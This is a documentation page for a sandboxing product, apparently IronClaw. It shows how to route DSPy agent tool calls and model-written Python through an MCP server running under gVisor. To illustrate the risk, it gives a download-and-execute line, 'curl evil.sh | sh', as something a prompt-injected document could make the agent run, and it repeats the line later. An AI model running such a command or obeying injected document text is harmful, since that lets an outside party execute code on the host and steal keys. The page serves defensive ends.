---
title: "Sandbox your DSPy agent with IronClaw"
description: How to sandbox a Stanford DSPy program. DSPy modules like ReAct and ProgramOfThought run model-chosen tools and model-written Python; route that execution through IronClaw's MCP server so it runs inside a sealed gVisor sandbox instead of your host, the model key held host-side and every call gated, plus a credential-free demo you can run first.
---

# Sandbox your DSPy agent with IronClaw

You built a program with **[DSPy](https://github.com/stanfordnlp/dspy)** (Stanford):
a signature, a module like `dspy.ReAct` or `dspy.ProgramOfThought`, and tools the
model can call. DSPy is a great way to *declare* the behavior. The problem starts
when it runs somewhere real: a `dspy.ReAct` tool or a `ProgramOfThought` snippet
executes **in your own process**, with your API key in memory, your filesystem, and
unrestricted outbound network. One prompt-injected instruction inside a document the
program reads and that same process runs `import os; os.system("curl evil.sh | sh")`.

IronClaw is the **security-hardened** option: the model-chosen command runs behind a
sealed sandbox under **gVisor (runsc)** with no network card, the model key held
**host-side** and never in the agent, and every privileged action gated and audited.

!!! example "Runnable example"
    A one-command DSPy to IronClaw example lives at
    [`examples/integrations/dspy`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/dspy):
    a `dspy.Tool` whose execution is backed by an IronClaw sandbox, with a battery of
    blocked escape attempts printed at the end. The credential-free demo below runs
    the same sealed loop today.

## The fix: run the tool in IronClaw, not your host

IronClaw ships an MCP server that exposes a single, blunt tool, **`sandbox_exec`**,
which runs any command or snippet inside an ephemeral, hardened box under **gVisor
(runsc)**: no network card, every Linux capability dropped, a non-root user, a
read-only root filesystem, and a restrictive seccomp profile. DSPy loads MCP tools
with `dspy.Tool.from_mcp_tool`:

```python
import dspy
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

server = StdioServerParameters(command="ironctl", args=["mcp", "serve"])

async with stdio_client(server) as (read, write):
    async with ClientSession(read, write) as session:
        await session.initialize()
        listing = await session.list_tools()
        tools = [dspy.Tool.from_mcp_tool(session, t) for t in listing.tools]

        react = dspy.ReAct("task -> answer", tools=tools)
        result = await react.acall(task="Analyze this log file and summarize the errors.")
```

The program still chooses the tool call. It just can no longer run it on your box:
every command lands inside the sealed sandbox, so a poisoned document that says
`curl evil.sh | sh` executes with no network card and nothing to steal.

!!! warning "gVisor (runsc) is the boundary"
    `ironctl mcp serve` passes `--runtime runsc` by default and **fails closed** if
    runsc is not installed rather than silently downgrading. Install gVisor from
    [gvisor.dev](https://gvisor.dev/docs/user_guide/install/). See
    [Run IronClaw as an MCP server](mcp-server.md) for HTTP transport and auth.

## Why sandbox this

A typical DSPy program that runs code:

```python
import dspy

dspy.configure(lm=dspy.LM("openai/gpt-4o"))     # key lives in this process
pot = dspy.ProgramOfThought("question -> answer")
pot(question="summarize today's incidents")     # runs model-written Python on YOUR host
```

Three things are true of that snippet, and all three are risks:

1. **The key is in the process.** Anything that reads `os.environ` reads it.
2. **The code runs with your privileges.** Model-written Python (or a ReAct shell
   tool) executes on your box, with your filesystem and network.
3. **Egress is wide open.** The process can reach any host on the internet.

Routing execution through `sandbox_exec` closes all three by construction, not by
convention.

## See it work first (no credentials)

Before wiring anything, watch the sealed loop run with the offline `mock` provider.
No model key, no tokens, just Docker:

```sh
git clone https://github.com/IronSecCo/ironclaw.git && cd ironclaw
docker compose -f docker-compose.demo.yml up --build -d      # start the demo control-plane

curl -s -X POST http://127.0.0.1:8787/v1/ui/chat/send \
  -H 'authorization: Bearer ironclaw-demo' -H 'content-type: application/json' \
  -d '{"agentGroupID":"mock-agent","text":"hello from dspy"}'
```

You get a sealed agent loop with a human-approval gateway and an append-only audit
log, before you point a single real key at it.

## Next steps

- [Run IronClaw as an MCP server](mcp-server.md) - full transport, auth, and
  containment-status detail for any MCP client.
- [Sandbox your LangChain agent](langchain.md) - the same MCP wiring for a
  LangChain agent.
- [Isolation, proven](../security-isolation.md) - how the sandbox holds under a real
  escape attempt.
